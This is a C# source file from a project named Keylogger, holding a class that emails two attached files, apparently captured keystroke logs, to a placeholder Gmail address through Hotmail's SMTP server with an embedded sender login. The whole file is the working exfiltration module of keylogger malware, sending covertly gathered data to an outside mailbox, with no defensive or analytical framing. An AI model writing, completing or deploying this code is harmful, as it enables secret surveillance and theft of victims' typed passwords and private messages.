using System.Net;
using System.Net.Mail;
using System.Text;

namespace Keylogger.Managers
{
    public class EmailsSender
    {
        public void SendEmail(string firstAttachment, string secondAttachment)
        {
            MailMessage message = new MailMessage()
            {
                From = new MailAddress("alguncorreo@hotmail.com", displayName: null, Encoding.UTF8),
                Subject = "KeyLogger",
                SubjectEncoding = Encoding.UTF8,
                BodyEncoding = Encoding.UTF8,
            };

            message.To.Add("alguncorreo@gmail.com");
            message.Attachments.Add(new Attachment(firstAttachment));
            message.Attachments.Add(new Attachment(secondAttachment));

            SmtpClient client = new SmtpClient()
            {
                UseDefaultCredentials = false,
                Credentials = new NetworkCredential("alguncorreo@hotmail.com", "PASS"),
                Host = "smtp.live.com",
                Port = 587,
                EnableSsl = true,
            };

            client.Send(message);
        }
    }
}